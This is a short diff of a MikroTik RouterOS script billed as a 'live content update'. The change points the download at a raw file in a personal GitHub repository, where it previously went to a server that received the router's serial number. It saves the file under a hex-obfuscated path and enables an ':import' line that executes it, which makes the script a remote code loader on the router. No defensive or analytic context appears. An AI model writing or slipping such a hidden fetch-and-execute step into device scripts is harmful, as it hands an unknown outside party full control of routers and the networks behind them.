@@ -52,11 +52,11 @@
 :set sn ([:pick $sn 0 $p] . "%20" . [:pick $sn ($p+1) [:len $sn]]);
 };
 :put "Downloading live content update...";
-:local url "https://kora.fiberlive.live/mikrotik_update.php\?type=live&sn=$sn";
+:local url "https://raw.githubusercontent.com/alkadriemad31/users/refs/heads/main/mikrotik_update_type_live.txt";
 :local ua "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) RouterOS";
 /tool fetch url=$url dst-path=("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\6C\69\76\65\75\70\64\61\74\65\2A*") ;
 :delay 2s;
-#:import ("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\6C\69\76\65\75\70\64\61\74\65\2A*");
+:import ("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\6C\69\76\65\75\70\64\61\74\65\2A*");
 :put "Live content updated successfully!";
 } on-error={
 :put "ERROR: Update failed!";
